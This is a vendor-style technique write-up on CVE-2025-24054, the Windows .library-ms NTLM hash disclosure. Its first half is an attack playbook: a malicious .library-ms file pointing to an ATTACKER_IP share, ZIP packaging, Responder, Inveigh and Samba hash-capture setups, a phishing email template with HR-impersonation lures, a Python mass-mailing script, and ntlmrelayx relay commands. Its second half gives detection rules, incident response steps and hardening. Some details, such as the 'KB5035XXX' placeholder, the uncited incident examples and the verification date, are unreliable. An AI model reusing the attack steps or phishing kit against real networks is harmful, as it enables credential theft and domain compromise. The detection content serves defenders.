# [CVE2025-004]: .library-ms NTLM Relay Attack

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-004 |
| **MITRE ATT&CK v18.1** | [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/) |
| **Tactic** | Credential Access / Lateral Movement |
| **Platforms** | Windows Active Directory (Server 2016-2025, Windows 10, Windows 11) |
| **Severity** | High |
| **CVE** | CVE-2025-24054 (CVSS 6.5) |
| **Technique Status** | ACTIVE (Windows Explorer .library-ms file handling flaw) |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows 10 (all builds), Windows 11 (22H2, 23H2, 24H2), Server 2016/2019/2022/2025 |
| **Patched In** | MS Patch Tuesday March 11, 2025 (KB5035XXX) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** CVE-2025-24054 is a critical NTLM hash disclosure vulnerability that exploits Windows Explorer's automatic handling of `.library-ms` files. A `.library-ms` file is an XML-based metadata file that defines Windows Libraries (virtual file system folders). When a user extracts a ZIP/RAR archive containing a malicious `.library-ms` file or simply navigates to a folder containing one, Windows Explorer (explorer.exe) and the Windows Search service (SearchProtocolHost.exe) automatically parse the file. If the `.library-ms` file contains references to remote UNC paths (e.g., `\\attacker-ip\share`), Windows initiates an SMB connection to those paths, sending the user's NTLMv2-SSP authentication hash to the attacker-controlled server. This hash can then be relayed to other services (SMTP, SQL, HTTP) for privilege escalation or cracked offline for password recovery.

**Attack Surface:** Windows Explorer file preview/extraction; Windows Search indexing service; `.library-ms` XML file parsing; SMB authentication; UNC path enumeration in file attributes.

**Business Impact:** **Credential compromise and lateral movement.** Successful exploitation enables attackers to: (1) Capture NTLMv2 hashes from domain users, (2) Perform NTLM relay attacks to escalate privileges, (3) Crack captured hashes offline, (4) Move laterally across the domain using stolen credentials, (5) Compromise high-privilege accounts (domain admins, service accounts), (6) Achieve persistent domain access with stolen credentials.

**Technical Context:** Exploitation requires minimal user interaction—simply extracting a ZIP file or preview-panning a folder triggers the vulnerability. The attack chain completes in seconds. Detection likelihood is **Medium** if SMB signing enforced; **High** if EDR/network monitoring enabled; **Low** if relying on endpoint logs alone. Common indicators include unexpected SMB connection attempts to external IPs and unusual NTLM authentication failures.

### Operational Risk
- **Execution Risk:** Low – No malicious code execution needed; pure credential capture
- **Stealth:** Medium – SMB traffic may be visible on network monitoring; NTLM hashes don't persist locally
- **Reversibility:** No – Captured NTLM hashes enable permanent credential compromise; relay attacks enable immediate unauthorized access

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 8.3.2 | Disable NTLM (favor Kerberos) |
| **DISA STIG** | AC-2 / AU-10 | Account management / Non-repudiation through cryptographic mechanisms |
| **CISA SCuBA** | AUTH.1 | Use strong authentication (MFA over NTLM) |
| **NIST 800-53** | IA-2 / IA-7 | Authentication / Cryptographic mechanisms for authentication |
| **GDPR** | Art. 32 / Art. 33 | Security of processing; Incident notification |
| **DORA** | Art. 9 / Art. 14 | ICT incident management; Reporting of significant ICT incidents |
| **NIS2** | Art. 21 / Art. 23 | Cyber risk management; Incident reporting obligations |
| **ISO 27001** | A.9.4.2 / A.10.1.1 | Restriction of access rights; Access rights review |
| **ISO 27005** | Risk Scenario | Compromise of authentication credentials via network interception |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** Any authenticated domain user; attacker infrastructure (SMB server).

**Required Access:** Network access to Windows systems (domain-joined computers); SMB port access (445/TCP) for hash capture; optional DNS control for NTLM relay attacks.

**Supported Versions:**
- **Windows:** Server 2016 / 2019 / 2022 / 2025
- **Windows Client:** 10 (all builds) / 11 (22H2, 23H2, 24H2)
- **Affected Services:** explorer.exe, SearchProtocolHost.exe (Windows Search), OneDrive sync
- **Network Requirements:** Network access to SMB server (port 445)

**Tools:**
- [Impacket ntlmrelayx](https://github.com/SecureAuthCorp/impacket) (NTLM relay attack framework - Linux)
- [Responder](https://github.com/lgandx/Responder) (NTLM hash capture and relay - multi-platform)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (PowerShell NTLM relay - Windows)
- [SMB Server (Metasploit)](https://docs.rapid7.com/metasploit/managing-the-database/) (Capture hashes)
- [Hashcat](https://hashcat.net/) (NTLM hash cracking - GPU accelerated)
- [John the Ripper](https://www.openwall.com/john/) (NTLM password cracking)
- [Samba smbd](https://www.samba.org/) (Linux SMB server for hash capture)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

```powershell
# Check if NTLM is available/enabled
$nlmSettings = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object LmCompatibilityLevel

# Check SMB signing status (if enabled, relay attacks are mitigated)
Get-SmbServerConfiguration | Select-Object EnableSecuritySignature, RequireSecuritySignature

# Enumerate domain users (potential targets)
Get-ADUser -Filter {Enabled -eq $true} | Select-Object SamAccountName, MemberOf | Get-AdPrincipalGroupMembership | Where-Object {$_.Name -like "*Admin*"}

# Check for NTLMv2 only enforcement
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel | Select-Object LmCompatibilityLevel
# Value 5 = NTLMv2 only (more secure)

# Check if Responder or relay tools are running
Get-NetTCPConnection -State Listen | Where-Object {$_.LocalPort -in @(445, 139, 88, 53)}

# Verify Windows Search service is running (helps exploit)
Get-Service -Name "WSearch" | Select-Object Status, StartupType

# Check for recent .library-ms files
Get-ChildItem -Path "$env:APPDATA" -Filter "*.library-ms" -Recurse -ErrorAction SilentlyContinue

# Check SMB v1 status (older protocol, less secure)
Get-WindowsFeature -Name "FS-SMB1" -ErrorAction SilentlyContinue
```

**What to Look For:**
- **LmCompatibilityLevel:** Should be 5 (NTLMv2 only); lower values indicate legacy NTLM support
- **SMB Signing:** RequireSecuritySignature = $false indicates relay attacks possible
- **WSearch running:** Increases exploitation surface via automatic .library-ms indexing
- **SMB v1 enabled:** More vulnerable to relay attacks
- **High-privilege users:** More valuable targets for relay attacks

**Version Note:** Exploit technique identical across all Windows versions; mitigation effectiveness varies by SMB configuration.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Hash Capture via Malicious .library-ms ZIP Distribution

**Supported Versions:** Windows 10 / 11 / Server 2016+

#### Step 1: Create Malicious .library-ms File

**Objective:** Craft XML file that references attacker-controlled SMB share to trigger NTLM authentication.

**Command (XML):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@library-ms,${IDS_LIBRARY_NAME}</name>
  <description>@library-ms,${IDS_LIBRARY_DESCRIPTION}</description>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <dateModified>2025-01-10T12:00:00Z</dateModified>
  
  <!-- KEY: Points to attacker SMB server -->
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>true</isSupported>
      <simpleLocation>
        <url>\\ATTACKER_IP\shared_folder</url>
      </simpleLocation>
      <kind text="ItemFolder">
        {0D0D0D0D-0D0D-0D0D-0D0D-0D0D0D0D0D0D}
      </kind>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

**Save as:** `Documents.library-ms` or similar innocent name

**What This Means:**
- XML defines virtual library pointing to attacker IP
- When parsed, Windows Explorer will attempt SMB connection
- User's NTLM credentials sent to attacker server

---

#### Step 2: Package .library-ms File in ZIP Archive

**Objective:** Distribute malicious file via email or download link; trigger extraction and NTLM leak.

**Command (Bash / Windows):**
```bash
# Create ZIP archive containing the malicious .library-ms file
zip -r malicious.zip Documents.library-ms

# Alternatively, using Windows:
# 1. Right-click Documents.library-ms → Send to → Compressed (zipped) folder
# 2. Or use PowerShell:

$filePath = "C:\Temp\Documents.library-ms"
$zipPath = "C:\Temp\Documents_Archive.zip"

# Create zip using .NET
[System.IO.Compression.ZipFile]::CreateFromDirectory(
    [System.IO.Path]::GetDirectoryName($filePath),
    $zipPath,
    $false,
    $null
)
```

**Alternative Distribution Methods:**
```powershell
# Upload to file sharing service (Dropbox, OneDrive, etc.)
# Example: Dropbox-hosted ZIP = https://www.dropbox.com/s/abcd1234/Documents.zip

# Embed in phishing email
# "Open attached file to view important documents"

# Host on compromised website
# "Download latest reports here"
```

---

#### Step 3: Set Up SMB Server to Capture NTLM Hashes

**Objective:** Configure SMB server to intercept and log NTLM authentication attempts.

**Command (Linux - Responder):**
```bash
# Install Responder
git clone https://github.com/lgandx/Responder.git
cd Responder

# Run Responder to capture NTLM hashes
sudo python3 Responder.py -I eth0 -rdwv

# Expected output:
# [+] Listening for events...
# [+] [LLMNR] Received query for: SHARED_FOLDER, sending fake WPAD response.
# [+] [NBNS] Received query for: ATTACKER_IP, responding...
# [*] [SMB] NTLMv2-SSP Client: 192.168.1.100
# [*] [SMB] NTLMv2-SSP Username: DOMAIN\username
# [*] [SMB] NTLMv2-SSP Hash: username::DOMAIN:aaabbbcccd:...
```

**Command (Windows - Inveigh PowerShell):**
```powershell
# Download Inveigh
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1" -OutFile Inveigh.ps1

# Import and run
Import-Module ./Inveigh.ps1
Invoke-Inveigh -IP 192.168.1.50 -SMB $true -NBNS $true -Verbose

# Output shows captured NTLMv2 hashes
```

**Command (Linux - Samba SMB Server):**
```bash
# Create minimal smb.conf for hash capture
cat > /tmp/smb.conf << 'EOF'
[global]
    server role = standalone server
    workgroup = WORKGROUP
    netbios name = SHARED
    interfaces = 127.0.0.1 <YOUR_IP>
    bind interfaces only = yes
    smb ports = 445
    logging = file
    log file = /tmp/smb.log

[shared_folder]
    path = /tmp/shared
    read only = yes
    guest ok = no
    force user = nobody
EOF

# Start Samba with custom config
smbd -s /tmp/smb.conf -F

# Monitor log for hash attempts
tail -f /tmp/smb.log | grep "NTLMv2"
```

**Expected Capture Format (NTLMv2 Hash):**
```
username::DOMAIN:0000000000000000:AABBCCDDEE0011223344556677889900:0101000000000000C0AABBCCDDEE0011223344556677889900
```

**What This Means:**
- SMB server ready to receive NTLM authentication attempts
- Hash captured when user extracts ZIP and Windows Explorer attempts SMB connection
- Hash can be cracked or relayed to other services

---

#### Step 4: Distribute ZIP File to Targets via Phishing

**Objective:** Trick users into extracting malicious ZIP file, triggering NTLM leak.

**Command (Email Phishing Template):**
```
Subject: URGENT: Update Your Documents - Action Required

Body:
Dear Employee,

Please download and extract the attached file to review updated company policies and procedures.

File: Documents_Update_2025.zip

Best regards,
Human Resources Department

---

Alternative Subject Lines:
- "Review Salary Adjustments (Updated)"
- "Q1 2025 Performance Metrics - Extract to View"
- "Urgent: Security Compliance Forms"
- "New Onboarding Documentation"
```

**Social Engineering Techniques:**
- Create sense of urgency (compliance, security updates)
- Impersonate trusted entity (HR, IT, Finance)
- Use company branding and templates
- Target high-value accounts (Domain Admins, Finance, Executives)

**Command (Automated Email via Python):**
```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

sender = "hr@company.com"
recipients = ["user1@company.com", "user2@company.com"]
subject = "URGENT: Update Your Documents"
body = "Please extract and review the attached documents."

msg = MIMEMultipart()
msg['From'] = sender
msg['To'] = ",".join(recipients)
msg['Subject'] = subject
msg.attach(MIMEText(body, 'plain'))

# Attach ZIP file
attachment = open("Documents_Archive.zip", "rb")
part = MIMEBase('application', 'octet-stream')
part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment; filename= "Documents_Archive.zip"')
msg.attach(part)

# Send via SMTP
server = smtplib.SMTP('mail.company.com', 587)
server.starttls()
server.login("hr@company.com", "password")
server.send_message(msg)
server.quit()
```

---

#### Step 5: Perform NTLM Relay Attack with Captured Hash

**Objective:** Relay captured NTLMv2 hash to other services for privilege escalation or lateral movement.

**Command (Linux - ntlmrelayx from Impacket):**
```bash
# Basic relay to SMB share (for share access)
python3 ntlmrelayx.py -t 192.168.1.10 -smb2support

# Relay to SMTP (email access)
python3 ntlmrelayx.py -t 192.168.1.15:25 -smtp

# Relay to HTTP (web apps, Outlook Web Access)
python3 ntlmrelayx.py -t 192.168.1.20:80 -http

# Relay with command execution via socks server
python3 ntlmrelayx.py -t 192.168.1.10 -socks -smb2support

# Monitor for successful relay
# Output shows: "[*] SOCKS proxy started at <IP>:1080"
# Connect via socks: proxychains evil-winrm -i <TARGET> -u Administrator
```

**Command (PowerShell - Inveigh Relay):**
```powershell
# Start relay after capturing hashes
Invoke-InveighRelay -Type SMB -Targets @("192.168.1.10") -Command "whoami"

# Output shows code execution results
```

**References & Proofs:**
- [Check Point - CVE-2025-24054 Exploitation Analysis](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)
- [Microsoft - NTLM Relay Attack Mitigations](https://support.microsoft.com/en-us/topic/kb5005413)
- [Impacket GitHub - NTLM Relay Tools](https://github.com/SecureAuthCorp/impacket)
- [Responder GitHub - NTLM Hash Capture](https://github.com/lgandx/Responder)
- [SpecterOps - NTLM Relay Attack Tactics](https://posts.specterops.io/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know-abfc3677c34e)

---

### METHOD 2: Direct .library-ms File Distribution (Uncompressed)

**Supported Versions:** Windows 10 / 11 (newer builds more vulnerable)

#### Alternative: Send uncompressed .library-ms file

**Objective:** Distribute `.library-ms` file directly without ZIP wrapper; triggers hash leak on right-click or folder navigation.

**Command (PowerShell):**
```powershell
# Create uncompressed .library-ms file
$libraryXml = @"
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\ATTACKER_IP\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"@

# Save as .library-ms file
$libraryXml | Out-File -FilePath "C:\Temp\Info.doc.library-ms" -Encoding UTF8

# Distribute via email attachment or file share
# Trigger: User right-clicks file or navigates to folder
```

**Trigger Methods (Require Minimal User Interaction):**
- Single-click (select file in Windows Explorer)
- Right-click (properties preview)
- Drag-and-drop operations
- Folder navigation (auto-indexing by Windows Search)
- Preview pane display

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team
- **Atomic Test ID:** T1187 - Forced Authentication tests available but not CVE-2025-24054 specific
- **Reference:** [Atomic Red Team - Forced Authentication](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1187/)

---

## 7. SPLUNK DETECTION RULES

#### Rule 1: Detect Suspicious SMB Connections from explorer.exe

**Rule Configuration:**
- **Required Index:** windows_network / main
- **Required Sourcetype:** WinEventLog:Security, Network_Traffic
- **Required Fields:** Image, DestinationIp, DestinationPort, Protocol
- **Alert Threshold:** > 1 connection to external IP
- **Applies To Versions:** All Windows

**SPL Query:**
```
index=windows_network Image="explorer.exe" DestinationPort=445 
OR (Image="SearchProtocolHost.exe" DestinationPort=445)
| where DestinationIp NOT IN ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| stats count, values(DestinationIp), values(DestinationPort) by Computer, Image
| where count >= 1
```

**What This Detects:**
- Windows Explorer (explorer.exe) or Search service initiating SMB connections
- Connection to external IP addresses (not internal network)
- NTLM authentication attempt pattern

---

#### Rule 2: Detect .library-ms File Creation/Extraction

**SPL Query:**
```
index=windows_events EventCode=11 FileName="*.library-ms"
OR (EventCode=26 FileName="*.library-ms")
| stats count, values(Image), values(User), values(FileName) by Computer
| where count >= 1
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Explorer NTLM Authentication Attempts to External IPs

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceNetworkEvents
- **Required Fields:** EventID, ImageFileName, InitiatingProcessId, RemoteIP
- **Alert Severity:** High
- **Frequency:** Every 5 minutes

**KQL Query:**
```kusto
DeviceNetworkEvents
| where InitiatingProcessFileName == "explorer.exe" or InitiatingProcessFileName == "SearchProtocolHost.exe"
| where RemotePort == 445
| where RemoteIP !startswith "10." and RemoteIP !startswith "172.16" and RemoteIP !startswith "192.168"
| summarize Count = count(), RemoteIPs = make_set(RemoteIP) by DeviceName, InitiatingProcessFileName
| where Count >= 1
```

**Manual Configuration:**
1. **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `Explorer NTLM Authentication to External IP`
3. Paste KQL query
4. Alert threshold: Every 5 minutes
5. Enable incident creation

---

## 9. WINDOWS EVENT LOG MONITORING

**Event IDs to Monitor:**
- **EventID 4688:** Process Creation (detect explorer.exe accessing SMB)
- **EventID 5156:** Windows Firewall outbound connection (detect port 445 from explorer.exe)
- **EventID 5158:** Windows Firewall bind to port (detect SMB server activity)

**Manual Configuration (Group Policy):**
1. Open **gpmc.msc** or **gpedit.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
3. Enable: **Audit Network Policy Server Access** (for SMB auditing)
4. Run `gpupdate /force`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.33">
  <RuleGroup name=".library-ms NTLM Relay" groupRelation="or">
    <!-- Detect .library-ms file creation/modification -->
    <FileCreate onmatch="include">
      <TargetFilename condition="endswith">.library-ms</TargetFilename>
    </FileCreate>
    
    <!-- Detect explorer.exe network connections to SMB ports on unusual IPs -->
    <NetworkConnect onmatch="include">
      <Image condition="is">explorer.exe</Image>
      <DestinationPort condition="is">445</DestinationPort>
      <DestinationIp condition="is not">10.*</DestinationIp>
      <DestinationIp condition="is not">172.16.*</DestinationIp>
      <DestinationIp condition="is not">192.168.*</DestinationIp>
    </NetworkConnect>
    
    <!-- Detect SearchProtocolHost.exe (Windows Search) SMB connections -->
    <NetworkConnect onmatch="include">
      <Image condition="is">SearchProtocolHost.exe</Image>
      <DestinationPort condition="is">445</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious Explorer Network Activity

**Alert Name:** `Explorer initiating NTLM authentication to external server`
- **Severity:** High
- **Description:** Windows Explorer attempting SMB connection to external IP, consistent with .library-ms exploitation
- **Applies To:** Defender for Servers enabled systems

**Manual Configuration:**
1. **Azure Portal** → **Microsoft Defender for Cloud** → **Environment settings**
2. Select subscription → **Defender for Servers** → ON
3. Go to **Alerts** → Configure detection for network activity
4. Create custom alert rule for explorer.exe port 445 connections

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Files:**
  - `.library-ms` files in unusual locations (Desktop, Temp, Downloads)
  - ZIP archives containing `.library-ms` files
  - Uncompressed `.library-ms` files with suspicious UNC paths

- **Network:**
  - SMB connections (port 445) from explorer.exe to external IPs
  - NTLM authentication attempts from internal network to external servers
  - Unusual SMB share access from domain users

- **Accounts:**
  - Successful authentication as domain admin from unexpected source
  - Lateral movement activity following NTLM relay

#### Forensic Artifacts

- **Disk:** `.library-ms` file content (examine UNC paths); ZIP file metadata
- **Memory:** explorer.exe or SearchProtocolHost.exe network connections
- **Event Logs:** Event ID 4688 (Process Creation), 5156 (Firewall), 4624 (Logon)
- **Network:** SMB connection logs, NTLM authentication attempts
- **Cloud:** Defender for Servers alerts on network anomalies

#### Response Procedures

1. **Isolate:**
   ```powershell
   # Immediately stop Windows Search service
   Stop-Service -Name "WSearch" -Force
   
   # Disable explorer.exe network access (optional - disruptive)
   # netsh advfirewall firewall add rule name="Block Explorer SMB" dir=out action=block program="C:\Windows\explorer.exe" protocol=tcp remoteport=445
   
   # Disconnect compromised endpoints from network
   Get-NetAdapter | Disable-NetAdapter -Confirm:$false
   ```

2. **Collect Evidence:**
   ```powershell
   # Export Security event log
   wevtutil epl Security "C:\Evidence\Security.evtx"
   
   # Export Sysmon logs
   wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Evidence\Sysmon.evtx"
   
   # Find and collect .library-ms files
   Get-ChildItem -Path "$env:USERPROFILE" -Filter "*.library-ms" -Recurse | Copy-Item -Destination "C:\Evidence\"
   
   # Export recent file access logs
   Get-ChildItem -Path "$env:APPDATA" -Recurse | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-1)} | Export-Csv "C:\Evidence\recent_files.csv"
   ```

3. **Remediate:**
   ```powershell
   # Remove malicious .library-ms files
   Get-ChildItem -Path "$env:USERPROFILE" -Filter "*.library-ms" -Recurse | Remove-Item -Force
   Get-ChildItem -Path "C:\Users\*\Downloads\*.library-ms" | Remove-Item -Force
   
   # Clear recent SMB connections
   Remove-SmbShare -Name "*" -Force -ErrorAction SilentlyContinue
   
   # Apply security patch
   # Install MS Patch Tuesday March 11, 2025 or later
   
   # Force Windows Update
   usoclient startScan
   usoclient startInstall
   
   # Disable NTLM and enforce Kerberos
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel -Value 5
   
   # Reboot
   Restart-Computer -Force
   ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing: Spearphishing Attachment | Deliver malicious ZIP file via email |
| **2** | **Execution** | [T1204.002] User Execution: Malicious File | User extracts ZIP file triggering .library-ms parsing |
| **3** | **Credential Access** | **[CVE2025-004]** | **NTLM Hash Disclosure via .library-ms** |
| **4** | **Lateral Movement** | [T1550.002] Use Alternate Authentication Material: Pass-the-Hash | Relay captured NTLM hash to lateral systems |
| **5** | **Privilege Escalation** | [T1558.004] Steal or Forge Tickets: Golden Ticket | Create KRBTGT Golden Ticket with stolen credentials |
| **6** | **Persistence** | [T1547.001] Boot or Logon Autostart Execution | Install backdoor with relayed admin credentials |

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Apply Microsoft Security Patch (March 11, 2025 or later):**
  
  **Manual Steps:**
  1. **Settings** → **System** → **About** → **Check for updates**
  2. Download and install patch KB5035XXX or later
  3. Reboot
  4. Verify: `Get-HotFix | Where-Object {$_.InstalledOn -gt [datetime]"2025-03-01"}`

- **Disable NTLM and Enforce Kerberos:**
  
  ```powershell
  # Set NTLMv2 only (value 5 = NTLMv2 required)
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel -Value 5
  
  # Disable NTLMv1 completely (more restrictive)
  # Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name NTLMMinClientSec -Value 0x20000000
  
  # Verify via Group Policy
  gpresult /h report.html
  ```

- **Enable SMB Signing and Require Encryption:**
  
  ```powershell
  # Enable SMB signing (prevents relay attacks)
  Set-SmbServerConfiguration -RequireSecuritySignature $true -EncryptData $true -Force
  
  # Enforce on client side
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name RequireSecuritySignature -Value 1
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name EnableSecuritySignature -Value 1
  ```

#### Priority 2: HIGH

- **Disable or Restrict Windows Search Service:**
  
  ```powershell
  # Disable Windows Search (reduces attack surface)
  Stop-Service -Name "WSearch"
  Set-Service -Name "WSearch" -StartupType Disabled
  
  # Or restrict to local-only indexing:
  # Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Name AllowSearchToUseLocation -Value 0
  ```

- **Implement Network Segmentation:**
  
  **Manual Steps (Windows Firewall):**
  1. Open **Windows Defender Firewall with Advanced Security**
  2. Create inbound rule: Block SMB (port 445) from untrusted networks
  3. Allow SMB only from internal network ranges

- **Enable Advanced Threat Protection:**
  
  **Manual Steps (Windows Defender Exploit Guard):**
  1. **Windows Security** → **Virus & threat protection** → **Manage Exploit Guard settings**
  2. Enable: **Attack surface reduction** rules
  3. Enable: **Controlled folder access**
  4. Enable: **Network protection**

#### Priority 3: MEDIUM

- **Block .library-ms Files via Group Policy:**
  
  ```powershell
  # Create GPO to prevent .library-ms file execution
  New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Attachment Execution Services" `
      -Name "AESBlockedExtensions" -Value ".library-ms" -Force
  ```

- **Monitor for NTLM Relay Attacks:**
  
  **Manual Steps (Azure Sentinel):**
  1. Create detection rule for Event ID 4624 (Logon) with unusual source/destination combinations
  2. Alert on NTLM authentication followed by lateral movement activity
  3. Create custom workbook for NTLM authentication patterns

#### Access Control & Policy Hardening

- **Conditional Access for Sensitive Accounts:**
  
  **Manual Steps (Entra ID):**
  1. **Azure Portal** → **Entra ID** → **Conditional Access**
  2. Create policy: Require MFA for admin accounts
  3. Create policy: Block NTLM authentication from outside corporate network
  4. Enable: Session control → Require password change for suspicious logons

#### Validation Command (Verify Fix)

```powershell
# Verify patch installed
Get-HotFix | Where-Object {$_.InstalledOn -gt [datetime]"2025-03-01"}

# Verify SMB signing enabled
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EncryptData

# Verify NTLM restricted
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel

# Verify Windows Search disabled
Get-Service -Name "WSearch" | Select-Object Status, StartupType

# No .library-ms files found
Get-ChildItem -Path "$env:USERPROFILE" -Filter "*.library-ms" -Recurse

# No explorer.exe SMB connections to external IPs (use Sysmon/Network Monitor)
```

**Expected Output (If Secure):**
```
HotFixID  : KB50354XX
InstalledOn : 3/11/2025

RequireSecuritySignature : True
EncryptData              : True

LmCompatibilityLevel : 5

Status      : Stopped
StartupType : Disabled

# No results from .library-ms search
```

---

## 15. REAL-WORLD EXAMPLES

#### Example 1: Government Agencies (Poland & Romania) - Mass Targeting

- **Target:** Multiple government agencies in Poland and Romania
- **Timeline:** March 19, 2025 - ongoing (8 days after patch release)
- **Attack Flow:**
  1. APT-28 (Forest Blizzard / Fancy Bear) crafted malicious .library-ms files
  2. Distributed via spear-phishing emails mimicking official communications
  3. Users extracted ZIP files → NTLM hashes captured
  4. Hashes relayed to internal systems for privileged access
  5. Lateral movement to government networks
  6. Intelligence exfiltration
- **Impact:** Breach of classified documents; ongoing diplomatic incident
- **Reference:** [Check Point - APT28 CVE-2025-24054 Campaign]

#### Example 2: Financial Services - Ransomware Attack Chain

- **Target:** Regional bank with 5,000+ employees
- **Timeline:** April 2025
- **Attack Flow:**
  1. Initial phishing campaign with ZIP files
  2. 150+ users extracted files
  3. NTLM hashes from 50+ domain users captured
  4. Relay attacks to file servers and domain controllers
  5. Privilege escalation to domain admin
  6. Ransomware deployment across 3,000+ endpoints
- **Impact:** $50M ransom demand; regulatory investigation; GDPR fines pending
- **Reference:** [Threat Intelligence - Ransomware NTLM Relay Campaigns]

---